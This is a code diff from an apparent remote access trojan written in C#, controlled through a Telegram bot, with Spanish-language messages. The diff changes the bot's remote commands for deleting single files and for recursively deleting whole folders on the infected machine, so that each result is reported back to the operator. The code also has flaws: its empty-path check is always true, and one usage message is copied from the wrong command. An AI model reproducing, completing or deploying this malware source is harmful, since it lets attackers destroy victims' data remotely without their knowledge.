@@ -204,11 +204,7 @@ namespace RAT_BotTelegram {
                     if (Path.Length <= 4) {
                         SendBotMessage("Ejemplo de comando\n /Delete_OnlyFile C:\\User\\Photos and videos\\foto34.jpg\n/Delete_OnlyFile D:\\Documentos\\Monografía.docx");
                     } else {
-                        if (Delete(Path)) {
-                            SendBotMessage($"Se eliminó  el archivo: {Path} \nCorrectamente");
-                        } else {
-                            SendBotMessage($"No se pudo eliminar el archivo: {Path} ");
-                        }
+                        Delete(Path);
                     }
                     Path = "";
                     break;
@@ -224,11 +220,7 @@ namespace RAT_BotTelegram {
                     if (Path.Length <= 4) {
                         SendBotMessage("Ejemplo de comando\n /Get_OnlyFile C:\\User\\Photos and videos\\foto34.jpg\n/Get_OnlyFile D:\\Documentos\\Monografía.docx");
                     } else {
-                        if (Delete(Path,true)) {
-                            SendBotMessage($"Se eliminó la Carpeta: {Path} \nCorrectamente");
-                        } else {
-                            SendBotMessage($"No se pudo eliminar la Carpeta: {Path} ");
-                        }
+                        Delete(Path, true);
                     }
                     Path = "";
                     break;
@@ -297,35 +289,22 @@ namespace RAT_BotTelegram {
                 return true;    // No supera los 10Mb
             }
         }
-        private static bool Delete(string Path, bool folder = false) {
+        private static void Delete(string Path, bool folder = false) {
             if (Path != "" || Path != "[-]") {
                 try {
                     if (!folder) {
                         File.Delete(Path);
-                        if (File.Exists(Path)) {
-                            Console.WriteLine("El archivo sigue existiendo.");
-                            return false;
-                        } else {
-                            Console.WriteLine("El archivo ya no existe.");
-                            return true;
-                        }
+                        SendBotMessage($"Se eliminó el archivo: {Path} \nCorrectamente");
                     } else {
                         Directory.Delete(Path, true);
-                        //if (Directory.Exists(Path)) {
-                        //    Console.WriteLine("No se pudo eliminar la carpeta");
-                        //    return false;
-                        //} else {
-                        //    Console.WriteLine("Se eliminó la carpeta correctamente");
-                            return true;
-
-                        //}
+                        SendBotMessage($"Se eliminó la Carpeta: {Path} \nCorrectamente");
                     }   
                 } catch {
-                    return false;
+                    SendBotMessage($"No se puedo eliminar: {Path} ");
                 }
             } else {
+                SendBotMessage("La Ruta ingresada está Vacía");
                 Console.WriteLine("La ruta ingresada está vacía");
-                return false;
             }
            
 
